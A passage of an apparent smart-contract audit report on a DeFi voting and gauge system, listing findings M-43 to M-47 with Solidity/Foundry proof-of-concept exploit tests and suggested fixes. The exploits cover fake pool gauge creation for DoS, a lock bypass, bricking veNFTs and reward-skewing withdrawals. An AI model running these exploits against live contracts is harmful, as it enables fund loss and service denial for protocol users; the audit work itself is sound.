    function setBalance(uint tokenId, uint bal) external;
}

contract MockVE is IMockVE, IVotingEscrow {
    address public override token;
    mapping(uint => address) _owner;
    mapping(uint => uint) _bal;

    constructor(address _token) { token = _token; }

    function setOwner(uint tokenId, address owner) external { _owner[tokenId] = owner; }
    function setBalance(uint tokenId, uint bal) external { _bal[tokenId] = bal; }

    function ownerOf(uint _tokenId) external view returns (address) { return _owner[_tokenId]; }
    function isApprovedOrOwner(address spender, uint tokenId) external view returns (bool) {
        return spender == _owner[tokenId];
    }
    function balanceOfNFT(uint tokenId) external view returns (uint) { return _bal[tokenId]; }
    function voting(uint) external {}
    function abstain(uint) external {}

    // Unused IVotingEscrow parts for this test
    function team() external pure returns (address) { return address(0); }
    function createLock(uint256, uint256) external pure returns (uint256) { return 0; }
}

interface IGM {
    function fetchInternalBribeFromPool(address) external returns (address);
    function fetchExternalBribeFromPool(address) external returns (address);
    function isGaugeAliveForPool(address) external returns (bool);
}

contract MockGaugeManager is IGM {
    mapping(address => address) internal _intBribe;
    mapping(address => address) internal _extBribe;
    mapping(address => bool) internal _alive;

    function setBribes(address pool, address i, address e) external { _intBribe[pool] = i; _extBribe[pool] = e; }
    function setAlive(address pool, bool v) external { _alive[pool] = v; }

    function fetchInternalBribeFromPool(address pool) external override returns (address) { return _intBribe[pool]; }
    function fetchExternalBribeFromPool(address pool) external override returns (address) { return _extBribe[pool]; }
    function isGaugeAliveForPool(address pool) external override returns (bool) { return _alive[pool]; }
}

interface IERC20Minimal { function transferFrom(address, address, uint) external returns (bool); function transfer(address, uint) external returns (bool); function balanceOf(address) external view returns (uint); function mint(address, uint) external; function approve(address, uint) external returns (bool); }

contract MockERC20 is IERC20Minimal {
    string public name = "R"; string public symbol = "R"; uint8 public decimals = 18;
    mapping(address => uint) public override balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to] += amt; }
    function approve(address s, uint a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint amt) external returns (bool) { require(balanceOf[msg.sender] >= amt); balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; }
    function transferFrom(address f, address t, uint a) external returns (bool) { require(balanceOf[f] >= a && allowance[f][msg.sender] >= a); allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true; }
}

contract MockBribe {
    address public voter;
    address public gaugeManager;
    mapping(uint256 => uint256) public balanceOf;
    uint256 public totalSupply;
    mapping(address => uint256) public rewards; // simple bucket, no epochs

    function setVoter(address _v) external { voter = _v; }
    function setGaugeManager(address _g) external { gaugeManager = _g; }

    function deposit(uint256 amount, uint256 tokenId) external { require(msg.sender == voter, "NA"); require(amount > 0, "ZV"); balanceOf[tokenId] += amount; totalSupply += amount; }
    function withdraw(uint256 amount, uint256 tokenId) external { require(msg.sender == voter, "NA"); require(amount > 0, "ZV"); if (amount <= balanceOf[tokenId]) { balanceOf[tokenId] -= amount; totalSupply -= amount; } }

    function notifyRewardAmount(address token, uint256 reward) external {
        IERC20Minimal(token).transferFrom(msg.sender, address(this), reward);
        rewards[token] += reward;
    }

    function getReward(uint tokenId, address[] memory tokens) external {
        require(msg.sender == gaugeManager, "NA");
        for (uint i=0;i<tokens.length;i++) {
            address t = tokens[i];
            uint r = rewards[t];
            if (r > 0 && totalSupply > 0) {
                uint share = r * balanceOf[tokenId] / totalSupply;
                rewards[t] -= share;
                IERC20Minimal(t).transfer(tx.origin, share); // credit to owner in test via tx.origin
            }
        }
    }
}

contract VoterReferentialExploitTest is Test {
    VoterV3 voter;
    MockVE ve;
    MockGaugeManager gm;
    MockBribe bribeA; // old
    MockBribe bribeB; // new
    MockERC20 rt;

    address pool = address(0xBEEF);
    uint256 tokenId = 1;

    function setUp() public {
        ve = new MockVE(address(0xDEAD));
        gm = new MockGaugeManager();
        voter = new VoterV3();
        voter.initialize(address(ve), address(0), address(gm), address(0));

        bribeA = new MockBribe(); bribeB = new MockBribe();
        bribeA.setVoter(address(voter)); bribeB.setVoter(address(voter));
        bribeA.setGaugeManager(address(this)); bribeB.setGaugeManager(address(this));

        gm.setAlive(pool, true);
        gm.setBribes(pool, address(bribeA), address(bribeA));

        ve.setOwner(tokenId, address(this));
        ve.setBalance(tokenId, 1e18);

        // Move into voting window
        vm.warp(HybraTimeLibrary.epochStart(block.timestamp) + 301);

        address[] memory pools = new address[](1); pools[0] = pool;
        uint[] memory weights = new uint[](1); weights[0] = 100;
        voter.vote(tokenId, pools, weights);
    }

    function claimThroughGM(address bribe, address[] memory toks) internal {
        // simulate GaugeManager.claimBribes single-call for this test
        MockBribe(bribe).getReward(tokenId, toks);
    }

    function testResetAfterBribeRotationLeavesOldBribeCredited_andAllowsClaims() public {
        // Rotate manager pointers to new bribe B
        gm.setBribes(pool, address(bribeB), address(bribeB));

        // Next epoch to satisfy onlyNewEpoch
        vm.warp(HybraTimeLibrary.epochStart(block.timestamp) + HybraTimeLibrary.WEEK + 301);
        voter.reset(tokenId);

        // Old bribe still records full weight (withdraw went to B and was a no-op)
        uint oldBal = bribeA.balanceOf(tokenId);
        assertGt(oldBal, 0, "stuck balance remains in old bribe A");

        // Re-vote so we now also have weight at new bribe B
        address[] memory pools = new address[](1); pools[0] = pool;
        uint[] memory weights = new uint[](1); weights[0] = 100;
        voter.vote(tokenId, pools, weights);

        // Fund old bribe; user can still claim from old bribe A while not having any Voter votes there
        rt = new MockERC20();
        rt.mint(address(this), 1e20);
        rt.approve(address(bribeA), type(uint).max);
        bribeA.notifyRewardAmount(address(rt), 1e19);

        address[] memory toks = new address[](1); toks[0] = address(rt);
        uint balBefore = rt.balanceOf(address(this));
        claimThroughGM(address(bribeA), toks);
        uint balAfter = rt.balanceOf(address(this));

        assertGt(balAfter, balBefore, "able to claim from old bribe after reset/revote");
    }
}


## Suggested Mitigation
Make VoterV3 withdraw from the exact bribes that were used at deposit time. Concretely: when recording a vote, persist the bribe (or gauge) addresses alongside poolVote[tokenId] (e.g., a parallel mapping tokenId=>pool=>{internalBribe,externalBribe} or tokenId=>pool=>gauge). In _reset and poke, use these stored addresses to withdraw. Alternatively, disallow bribe address rotation for a live gauge, or add an on-chain migration hook when rotating bribes that migrates all tokenId balanceOf from the old bribe to the new one (admin-only), ensuring no stale weight remains. Also consider adding a safety fallback to attempt withdraw on both the stored and current bribe addresses.





 **Derived From** : Permissionless CL gauge creation accepts arbitrary fake pools (isPair bypass)

## [M-43]. Permissionless CL gauge creation bypasses pool validation for CL (gaugeType=1), allowing arbitrary fake pools to be registered and bloating pools[]

## Derived From Pattern/Invariant
Permissionless CL gauge creation accepts arbitrary fake pools (isPair bypass)

## Exploit Type
AuthByPass

## Location
GaugeManager.createGauge/_createGauge

## Minimim Privilege Required
Permissionless

## Description
GaugeManager.createGauge() is permissionless and delegates to _createGauge(). For CL gauges (gaugeType == 1) the pool validation is effectively disabled: the code sets isPair = true without verifying the pool is from the registered CL factory or even a real pool. As a result, any contract implementing token0()/token1() and setGaugeAndPositionManager() can be passed as _pool to create a bogus CL gauge. Each created entry is pushed into pools[], which is iterated by distributeAll() and distributeFees(), enabling gas grief/DoS. Vulnerable snippet:

function createGauge(address _pool, uint256 _gaugeType) external nonReentrant { (_gauge, _internal_bribe, _external_bribe) = _createGauge(_pool, _gaugeType); }
...
if(_gaugeType == 1) {
    // removed due to code size
    // require(_pool_hyper == _pool_factory, 'wrong tokens');
    isPair = true;
}
...
pools.push(_pool);
IERC20(base).approve(_gauge, type(uint256).max);

## Impact
Because gaugeType==1 (CL) accepts arbitrary _pool without verifying it belongs to the registered CL factory, any user can register unbounded fake pools and create valid GaugeCL instances pointing to non-pools. Each creation appends to pools[]. Subsequent keeper calls to distributeFees() will iterate pools and execute IGaugeCL(gauge).claimFees(), which internally calls into the fake pool’s CL interfaces and reverts. This causes a hard revert of distributeFees() (and similarly distributeAll() when it reaches a malicious entry), blocking fee sweeping and potentially blocking weekly emissions distribution unless operators carefully shard ranges and skip bad pools. No direct asset theft occurs, but the protocol’s core distribution and fee collection functions can be griefed and operationally DoS’d while pool list gas usage inflates. Severity: Medium (availability/DoS).

## Proof of Concept
High-level steps to exploit:
1) Attacker deploys a fake pool contract that only implements token0(), token1(), and setGaugeAndPositionManager(), returning any pair of whitelisted tokens; it does NOT implement CL pool methods like collectFees().
2) Attacker calls GaugeManager.createGauge(fakePool, 1). For gaugeType==1, the code sets isPair=true without checking factory, so the gauge is created and pools.push(fakePool) is performed. GaugeManager also calls ICLPool(_pool).setGaugeAndPositionManager(), which succeeds on the fake pool since it exposes that function.
3) Repeat step 2 many times with fresh fake pools to bloat pools[].
4) When a keeper calls distributeFees(), the loop iterates pools[], finds the malicious entries, and invokes IGaugeCL(gauge).claimFees(). The CL gauge will try to call clPool.collectFees() on the provided _pool, which is a fake contract and will revert (no selector), reverting the entire distributeFees() transaction and blocking fee collection for all pools.
5) Similarly, distributeAll() will revert once it encounters such a gauge (IGaugeCL.notifyRewardAmount path can revert when interacting with the fake pool), impairing weekly emissions distribution.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import "contracts/GaugeManager.sol";
import "contracts/CLGauge/interface/ICLPool.sol";

contract MockERC20 {
    string public name = "Mock"; string public symbol = "M"; uint8 public decimals = 18; uint public totalSupply = 1e27;
    mapping(address=>mapping(address=>uint)) public allowance; mapping(address=>uint) public balanceOf;
    constructor(){ balanceOf[msg.sender] = totalSupply; }
    function approve(address s, uint a) external returns (bool){ allowance[msg.sender][s]=a; return true; }
}

contract MockVE { address public _token; constructor(address t){_token=t;} function token() external view returns(address){return _token;} }

contract MockPermissionsRegistry {
    // Always authorize in tests
    function hasRole(bytes memory, address) external pure returns (bool) { return true; }
    function hybraTeamMultisig() external view returns (address) { return address(this); }
}

contract MockTokenHandler {
    function isWhitelisted(address) external pure returns (bool) { return true; }
    function isConnector(address) external pure returns (bool) { return true; }
}

contract MockBribe { }

contract MockBribeFactory is IBribeFactory {
    function createBribe(address, address, address, string memory) external returns (address) { return address(new MockBribe()); }
    function createInternalBribe(address[] memory) external pure returns (address) { return address(0); }
    function createExternalBribe(address[] memory) external pure returns (address) { return address(0); }
}

// Minimal malicious-like Gauge that will revert on claimFees() when pool isn't a real CL pool
contract BadGaugeCL {
    address public pool;
    constructor(address _pool){ pool = _pool; }
    function claimFees() external returns (uint256, uint256) {
        // This will revert if pool is not a real CL pool exposing collectFees()
        ICLPool(pool).collectFees();
        return (0,0);
    }
    // Stub to satisfy IGaugeCL usage in GaugeManager (not used in this test)
    function notifyRewardAmount(address, uint) external pure returns (uint256) { return 0; }
    function emergency() external pure returns (bool) { return false; }
}

contract MockGaugeFactoryCL is IGaugeFactoryCL {
    function createGauge(
        address, address, address _pool, address, address, address, bool, address
    ) external returns (address) {
        return address(new BadGaugeCL(_pool));
    }
    function gauges(uint256) external pure returns(address) { return address(0); }
    function length() external pure returns(uint){ return 0; }
}

// Fake pool implementing only the selectors GaugeManager expects
contract FakePool {
    address public t0; address public t1; address public gaugeSet; address public nfpmSet;
    constructor(address _t0, address _t1){ t0=_t0; t1=_t1; }
    function token0() external view returns(address){ return t0; }
    function token1() external view returns(address){ return t1; }
    function setGaugeAndPositionManager(address g, address n) external { gaugeSet=g; nfpmSet=n; }
}

contract CLGaugeCreationDoSTest is Test {
    GaugeManager gm;
    MockERC20 base;
    MockVE ve;
    MockPermissionsRegistry pr;
    MockTokenHandler th;
    MockBribeFactory bf;
    MockGaugeFactoryCL gfcl;

    function setUp() public {
        base = new MockERC20();
        ve = new MockVE(address(base));
        pr = new MockPermissionsRegistry();
        th = new MockTokenHandler();
        bf = new MockBribeFactory();
        gfcl = new MockGaugeFactoryCL();

        gm = new GaugeManager();
        // _gaugeFactory (v2) = address(1), _gaugeFactoryCL = gfcl, _pairFactory (v2)=address(2), _pairFactoryCL=address(3)
        gm.initialize(address(ve), address(th), address(0x1), address(gfcl), address(0x2), address(0x3), address(pr), address(0x4));
        // Grant/set bribeFactory (Guarded by GAUGE_ADMIN -> mocked registry always true)
        gm.setBribeFactory(address(bf));
    }

    function test_DistributeFees_Reverts_With_BogusCLGauge() public {
        // Attacker deploys two arbitrary fake pools (not from the CL factory)
        FakePool p1 = new FakePool(address(base), address(base));
        FakePool p2 = new FakePool(address(base), address(base));

        // Permissionless gauge creation for CL (gaugeType = 1)
        (address g1,,) = gm.createGauge(address(p1), 1);
        (address g2,,) = gm.createGauge(address(p2), 1);
        assertTrue(g1 != address(0) && g2 != address(0), "gauges not created");
        assertEq(gm.pools(0), address(p1));
        assertEq(gm.pools(1), address(p2));

        // Because BadGaugeCL.claimFees() calls collectFees() on FakePool (which lacks it), distributeFees should revert
        vm.expectRevert();
        gm.distributeFees();

        // Governance can kill a malicious gauge to skip it in loops (mock registry always authorizes)
        gm.killGauge(g1);
        // Still reverts due to the second malicious gauge
        vm.expectRevert();
        gm.distributeFees();

        // Kill the second as well; now distributeFees should not revert
        gm.killGauge(g2);
        gm.distributeFees();
    }
}


## Suggested Mitigation
Strictly validate that a CL pool belongs to the registered CL factory before creating a gauge and pushing into pools[]. For example:
- For gaugeType == 1, require ICLFactory(_factory).isPool(_pool) == true.
- Additionally, cross-check the factory relationship to prevent spoofing: require ICLPool(_pool).factory() == _factory (if exposed) and/or compute the expected pool via factory.getPool(tokenA, tokenB, ICLPool(_pool).tickSpacing()) == _pool.
- If the CL pool interface doesn’t expose factory or tickSpacing directly, add a small interface to read them, or rely on isPool() alone.
Operational hardening:
- Add an admin-only removal method to prune malicious pools from pools[] (or maintain a separate iterable set of active pools) to avoid unbounded loop growth.
- Consider a pre-flight try/catch or a per-pool liveness flag updated on failure, so distributeFees()/distributeAll() can skip permanently failing gauges without reverting the whole loop.
- As a stopgap, keepers can use the batched range variants (distribute/distributeFees with start/finish) to bypass bad entries, but factory-based validation is the essential fix.





 **Derived From** : Maturity lock is never set; withdraw lock effectively bypassed

## [M-44]. Uninitialized maturityTime lets users instantly withdraw, bypassing intended lock in GaugeV2._withdraw

## Derived From Pattern/Invariant
Maturity lock is never set; withdraw lock effectively bypassed

## Exploit Type
UpgradeabilityInitializerSafety

## Location
GaugeV2._withdraw

## Minimim Privilege Required
Permissionless

## Description
GaugeV2 declares mapping(address=>uint256) maturityTime and gates _withdraw() with require(block.timestamp >= maturityTime[msg.sender], "!MATURE"). However, maturityTime is never written anywhere in the contract, so it always reads as 0 for all users. Since block.timestamp >= 0 is always true, any depositor can withdraw immediately, defeating any intended maturity/lock design. Vulnerable snippet:

mapping(address => uint256) public maturityTime;
...
function _withdraw(uint256 amount) internal ... {
    require(block.timestamp >= maturityTime[msg.sender], "!MATURE");
    _totalSupply = _totalSupply - amount;
    _balances[msg.sender] = _balances[msg.sender] - amount;
    ...
}

This is an InitOrder/Uninitialized state bug: a critical guard relies on storage that is never initialized/set.

## Impact
The maturity/lock mechanism is never enforced, allowing users to deposit and withdraw immediately at any time. This nullifies intended participation/lockup incentives (e.g., genesis lock, maturity windows) and can distort protocol assumptions around user stickiness and incentive design. While funds are not directly stolen, the core policy is bypassed and any economics relying on the lock are invalidated.

## Proof of Concept
1) Attacker gets underlying TOKEN and approves GaugeV2.
2) Attacker calls deposit(amount).
3) In the same block, attacker calls withdraw(amount).
4) Withdrawal succeeds because maturityTime[attacker] defaults to 0 and the require() check always passes.
5) This bypasses intended maturity/lock gating.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2} from "contracts/GaugeV2.sol";
import {HYBR} from "contracts/HYBR.sol";

contract GaugeV2MaturityTest is Test {
    HYBR internal token;
    HYBR internal reward;
    GaugeV2 internal gauge;
    address internal attacker = address(0xBEEF);

    function setUp() public {
        // Deploy simple ERC20s to act as TOKEN and rewardToken
        token = new HYBR();
        reward = new HYBR();

        // HYBR.minter defaults to this contract, so we can mint
        token.mint(attacker, 1_000e18);

        // Deploy GaugeV2 with minimal placeholders for unused params
        gauge = new GaugeV2(
            address(reward),          // rewardToken
            address(0xDEAD),          // rHYBR (unused in this test)
            address(0xBADA),          // VE (unused)
            address(token),           // TOKEN (underlying)
            address(this),            // DISTRIBUTION (unused)
            address(0),               // internal_bribe
            address(0),               // external_bribe
            false                     // isForPair
        );

        vm.startPrank(attacker);
        token.approve(address(gauge), type(uint256).max);
        vm.stopPrank();
    }

    function test_InstantWithdrawBypassesMaturity() public {
        vm.startPrank(attacker);
        gauge.deposit(100e18);
        // maturityTime is never set, defaults to 0
        assertEq(gauge.maturityTime(attacker), 0);

        // Immediate withdraw should succeed (bypassing intended maturity lock)
        gauge.withdraw(100e18);
        vm.stopPrank();

        // All tokens returned and gauge supply cleared
        assertEq(token.balanceOf(attacker), 1_000e18);
        assertEq(gauge.totalSupply(), 0);
    }
}


## Suggested Mitigation
Either enforce or remove the maturity feature. If enforcing, set maturityTime on deposit (and define behavior for subsequent deposits):
- On first deposit: maturityTime[user] = block.timestamp + LOCK_PERIOD (e.g., HybraTimeLibrary.GENESIS_STAKING_MATURITY_TIME or a configurable value).
- On additional deposits: either (a) extend to max(maturityTime[user], block.timestamp + LOCK_PERIOD) to avoid grief, or (b) reset the timer if that’s the intended policy.
If a maturity lock is not desired, remove the maturityTime check entirely to avoid dead code and misleading guards.





 **Derived From** : idToOwner[_tid] == owner && tokenOfOwnerByIndex(owner, tokenToOwnerIndex[_tid]) == _tid for all existing tokenIds; ownerToNFTokenCount[owner] equals number of indices [0..ownerToNFTokenCount[owner]-1] where ownerToNFTokenIdList[owner][i] != 0

## [H-45]. Transfer to zero address corrupts owner-index tables and bricks veNFT (permanent fund loss)

## Derived From Pattern/Invariant
idToOwner[_tid] == owner && tokenOfOwnerByIndex(owner, tokenToOwnerIndex[_tid]) == _tid for all existing tokenIds; ownerToNFTokenCount[owner] equals number of indices [0..ownerToNFTokenCount[owner]-1] where ownerToNFTokenIdList[owner][i] != 0

## Exploit Type
EventConsistency

## Location
VotingEscrow._transferFrom

## Minimim Privilege Required
Permissionless

## Description
VotingEscrow._transferFrom does not validate _to != address(0). As a result, transferFrom/safeTransferFrom can send a veNFT to the zero address. The code then: (1) removes the token from the current owner lists; (2) adds it to ownerToNFTokenIdList[address(0)] and increments ownerToNFTokenCount[address(0)]; (3) sets idToOwner[tokenId] = address(0). This breaks the swap-with-last referential invariant because the token has no valid owner (idToOwner == 0) while the owner-index tables claim the zero address owns it. The NFT becomes irrecoverable (no owner nor approval can call withdraw after expiry), permanently locking the underlying HYBR and corrupting enumeration for address(0). Vulnerable snippet (no zero-address check):

function _transferFrom(address _from, address _to, uint _tokenId, address _sender) internal notPartnerNFT(_tokenId) {
    require(attachments[_tokenId] == 0 && !voted[_tokenId], "ATT");
    require(_isApprovedOrOwner(_sender, _tokenId), "NAO");
    _clearApproval(_from, _tokenId);
    _removeTokenFrom(_from, _tokenId);
    VotingDelegationLib.moveTokenDelegates(cpData, delegates(_from), delegates(_to), _tokenId, ownerOf);
    _addTokenTo(_to, _tokenId); // _to may be address(0)
    ownership_change[_tokenId] = block.number;
    emit Transfer(_from, _to, _tokenId);
}


## Impact
A holder (or any approved operator) can transfer a veNFT to the zero address, permanently bricking it and locking its underlying HYBR forever. State is corrupted: owner-index tables record address(0) as owner while idToOwner is zero, violating referential invariants and breaking enumeration assumptions.

## Proof of Concept
1) Attacker (or the NFT owner) creates a veNFT via create_lock.
2) Calls transferFrom(owner, address(0), tokenId) (or safeTransferFrom) which succeeds.
3) Post-state:
   - ve.ownerOf(tokenId) == address(0)
   - ve.ownerToNFTokenCountFn(address(0)) increased; ve.tokenOfOwnerByIndex(address(0), 0) == tokenId
   - No one can call withdraw(tokenId) after expiry (no valid owner/approval), permanently locking funds.


## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";

contract MockERC20 {
    string public name = "MOCK"; string public symbol = "MOCK"; uint8 public decimals = 18;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint amt) external returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transferFrom(address from, address to, uint amt) external returns (bool){
        require(allowance[from][msg.sender] >= amt, "allow");
        require(balanceOf[from] >= amt, "bal");
        allowance[from][msg.sender] -= amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true;
    }
}

contract VE_ZeroTransfer_Invariant_Test is Test {
    VotingEscrow ve;
    MockERC20 token;
    address user = address(0xA11CE);

    function setUp() public {
        token = new MockERC20();
        ve = new VotingEscrow(address(token), address(0xBEEF));
        token.mint(user, 1_000e18);
        vm.startPrank(user);
        token.approve(address(ve), type(uint).max);
        vm.stopPrank();
    }

    function test_TransferToZeroCorruptsOwnerIndexAndBricks() public {
        vm.startPrank(user);
        // lock for ~2 epochs (WEEK in repo test config = 1800s). Any >0 duration works.
        uint tid = ve.create_lock(100e18, 3600);
        assertEq(ve.ownerOf(tid), user);
        // send to zero address (should not be allowed)
        ve.transferFrom(user, address(0), tid);
        // owner mapping is zero
        assertEq(ve.ownerOf(tid), address(0));
        // zero address index tables polluted with this tokenId
        assertEq(ve.ownerToNFTokenCountFn(address(0)), 1);
        assertEq(ve.tokenOfOwnerByIndex(address(0), 0), tid);
        // even after expiry, withdraw is impossible (no valid owner/approval)
        (,uint end_,) = ve.locked(tid);
        vm.warp(end_ + 1);
        vm.expectRevert();
        ve.withdraw(tid);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Disallow zero-address transfers. Add `require(_to != address(0), "ZA");` at the top of _transferFrom (the single internal entry used by both transferFrom and safeTransferFrom). This preserves ERC721 semantics and prevents corrupting owner-index tables and bricking veNFTs.





 **Derived From** : Emergency withdraw mutates supply without updating reward index (skews emissions)

## [H-46]. GaugeV2 emergency withdrawals don’t checkpoint rewards, inflating rewardPerToken and stealing matured emissions from leavers

## Derived From Pattern/Invariant
Emergency withdraw mutates supply without updating reward index (skews emissions)

## Exploit Type
AccountingInvariantViolation

## Location
GaugeV2.emergencyWithdraw/emergencyWithdrawAmount

## Minimim Privilege Required
Permissionless

## Description
In GaugeV2, both emergencyWithdraw and emergencyWithdrawAmount reduce _totalSupply and user balances without first advancing the global reward index (rewardPerTokenStored/lastUpdateTime). While a reward stream is active, the next rewardPerToken() calculation applies the entire elapsed interval since lastUpdateTime using the now-lower _totalSupply, inflating rewardPerToken for remaining stakers. Users who exit via emergency lose their matured but unclaimed rewards, which are redistributed to those who remain. Vulnerable snippets:

function emergencyWithdraw() external nonReentrant {
    require(emergency, "EMER");
    uint256 _amount = _balanceOf(msg.sender);
    require(_amount > 0, "ZV");
    _totalSupply = _totalSupply - _amount;     // missing updateReward(address(0)) before supply change
    _balances[msg.sender] = 0;
    TOKEN.safeTransfer(msg.sender, _amount);
    emit Withdraw(msg.sender, _amount);
}

function emergencyWithdrawAmount(uint256 _amount) external nonReentrant {
    require(emergency, "EMER");
    _totalSupply = _totalSupply - _amount;     // missing updateReward(address(0)) before supply change
    _balances[msg.sender] = _balances[msg.sender] - _amount;
    TOKEN.safeTransfer(msg.sender, _amount);
    emit Withdraw(msg.sender, _amount);
}

Impact: breaks reward accounting invariants and enables overpayment to remaining stakers at the expense of emergency leavers’ matured yield.

## Impact
Emergency exits during an active reward stream backfill rewardPerToken using the post-withdraw lower totalSupply for the entire uncheckpointed interval. This overpays remaining stakers while the emergency leaver loses their matured but unclaimed rewards (often 100% for that window). This is a direct, irreversible loss of matured yield for the leaver and redistribution to others.

## Proof of Concept
Scenario: Two users stake equal amounts and a reward stream begins. After some time elapses, owner activates emergency mode. One user exits via emergencyWithdraw. Because the gauge did not checkpoint rewards before reducing _totalSupply, rewardPerToken() is recomputed for the entire elapsed interval using the now-lower supply, doubling the remaining user’s earnings for that backdated window, while the leaver’s matured yield becomes zero and is effectively redistributed.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2} from "contracts/GaugeV2.sol";
import {HYBR} from "contracts/HYBR.sol";

contract GaugeAccountingInvariantTest is Test {
    GaugeV2 gauge;
    HYBR reward;
    HYBR lp;
    address alice = address(0xA11CE);
    address bob   = address(0xB0B);

    function setUp() public {
        reward = new HYBR();
        lp = new HYBR();
        // distribution = this, rHYBR = dummy(1), ve=0, internal/external bribe = 0, isForPair=false
        gauge = new GaugeV2(address(reward), address(1), address(0), address(lp), address(this), address(0), address(0), false);

        // fund users and approve
        lp.mint(alice, 100e18);
        lp.mint(bob, 100e18);
        vm.prank(alice); lp.approve(address(gauge), type(uint256).max);
        vm.prank(bob);   lp.approve(address(gauge), type(uint256).max);

        // deposits
        vm.prank(alice); gauge.deposit(100e18);
        vm.prank(bob);   gauge.deposit(100e18);

        // start reward stream: mint to DISTRIBUTION (this) and notify
        reward.mint(address(this), 1000e18);
        reward.approve(address(gauge), type(uint256).max);
        gauge.notifyRewardAmount(address(reward), 1000e18);
    }

    function test_emergencyWithdrawSkewsRewards() public {
        // accrue for 600s with both staked
        vm.warp(block.timestamp + 600);

        // enable emergency and have bob exit via emergencyWithdraw (no checkpoint)
        gauge.activateEmergencyMode();
        vm.prank(bob);
        gauge.emergencyWithdraw();

        // expected fair accrual for alice for elapsed 600s with pre-withdraw supply (200)
        uint256 rr = gauge.rewardRate(); // tokens/sec
        uint256 maturedTotal = 600 * rr; // total tokens accrued
        uint256 expectedAlice = maturedTotal * 100e18 / 200e18; // 50% share

        // due to bug, earned() backfills using now-lower supply (100) for entire 600s, so alice gets > expected
        uint256 aliceEarned = gauge.earned(alice);
        assertGt(aliceEarned, expectedAlice, "alice inflated rewards not observed");

        // bob lost his matured yield entirely
        uint256 bobEarned = gauge.earned(bob);
        assertEq(bobEarned, 0, "bob should have lost matured yield due to missing checkpoint");
    }
}


## Suggested Mitigation
Checkpoint rewards before mutating supply. Add the updateReward(msg.sender) modifier to both emergencyWithdraw and emergencyWithdrawAmount so rewardPerTokenStored/lastUpdateTime are advanced using the pre-withdraw supply and the leaver’s accrued rewards are recorded. Example:

function emergencyWithdraw() external nonReentrant updateReward(msg.sender) {
    require(emergency, "EMER");
    uint256 amt = _balances[msg.sender];
    require(amt > 0, "ZV");
    _totalSupply -= amt;
    _balances[msg.sender] = 0;
    TOKEN.safeTransfer(msg.sender, amt);
    emit Withdraw(msg.sender, amt);
}

function emergencyWithdrawAmount(uint256 amt) external nonReentrant updateReward(msg.sender) {
    require(emergency, "EMER");
    require(amt > 0, "ZV");
    _totalSupply -= amt;
    _balances[msg.sender] -= amt;
    TOKEN.safeTransfer(msg.sender, amt);
    emit Withdraw(msg.sender, amt);
}

Optional: invoke gaugeRewarder.onReward(msg.sender, msg.sender, _balanceOf(msg.sender)) to keep auxiliary rewarders in sync.





 **Derived From** : getProtocolFee directly calls gaugeManager without safe fallback; reverting manager bricks fee path

## [M-47]. Griefable external call in CLFactory.getProtocolFee lets gaugeManager DoS CLPool swaps/flash

## Derived From Pattern/Invariant
getProtocolFee directly calls gaugeManager without safe fallback; reverting manager bricks fee path

## Exploit Type
Dos

## Location
CLFactory.getProtocolFee

## Minimim Privilege Required
RequiresRole

## Description
CLFactory.getProtocolFee makes a direct external call to gaugeManager.isGaugeAliveForPool(pool) with no try/catch, no address(0)/hasCode guard, and no low-level success check. If gaugeManager is unset (address(0)), a non-contract, or intentionally/maliciously reverts, getProtocolFee reverts. CLPool.applyUnstakedFees() calls protocolFee() during swap/flash via calculateFees(), so any revert here bricks swap/flash across all pools (trading liveness DoS). Vulnerable snippet:

function getProtocolFee(address pool) external view override returns (uint24) {
    if (gaugeManager.isGaugeAliveForPool(pool)) { // direct external call, no guard
        return 0;
    }
    if (protocolFeeModule != address(0)) {
        (bool success, bytes memory data) = protocolFeeModule.excessivelySafeStaticCall(
            200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)
        );
        if (success) { ... }
    }
    return defaultProtocolFee;
}

In contrast to fee modules (which are safely static-called), the gauge manager hook is unguarded and can grief the core flow.

## Impact
A reverting or unset (EOA/zero) gaugeManager makes CLFactory.getProtocolFee (and getUnstakedFee) revert, which is called inside CLPool.calculateFees via applyUnstakedFees during swap/flash. This bricks swaps and flash loans across all CL pools until the reference is corrected, impacting protocol availability and fee accounting.

## Proof of Concept
Reproduction steps:
1) Deploy CLFactory and CLPool, add minimal liquidity.
2) Point CLFactory.gaugeManager to a contract that always reverts in isGaugeAliveForPool (or leave it unset/EOA).
3) Trigger a pool flash or swap. During fee split, CLPool.applyUnstakedFees() -> protocolFee() -> CLFactory.getProtocolFee() performs a direct external call to gaugeManager.isGaugeAliveForPool(pool) which reverts, causing the entire operation to revert. This DoS affects every pool sharing the same factory-level gaugeManager.

## Proof of Code
pragma solidity =0.7.6;
pragma abicoder v2;

import "ds-test/test.sol";
import "contracts/core/CLFactory.sol";
import "contracts/core/CLPool.sol";
import "contracts/core/libraries/TickMath.sol";
import "contracts/core/libraries/TransferHelper.sol";
import "contracts/core/interfaces/callback/ICLMintCallback.sol";
import "contracts/core/interfaces/callback/ICLFlashCallback.sol";
import "contracts/core/interfaces/callback/ICLSwapCallback.sol";
import "contracts/core/interfaces/IGaugeManager.sol";

contract RevertingGaugeManager is IGaugeManager {
    function isGaugeAliveForPool(address) external view override returns (bool) { revert("GM_FAIL"); }
    function gauges(address) external view override returns (address) { return address(0); }
    function isGauge(address) external view override returns (bool) { return false; }
    function poolForGauge(address) external view override returns (address) { return address(0); }
}

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals; uint public totalSupply;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    constructor(string memory n, string memory s, uint8 d){name=n;symbol=s;decimals=d;}
    function mint(address to, uint amt) external { balanceOf[to]+=amt; totalSupply+=amt; }
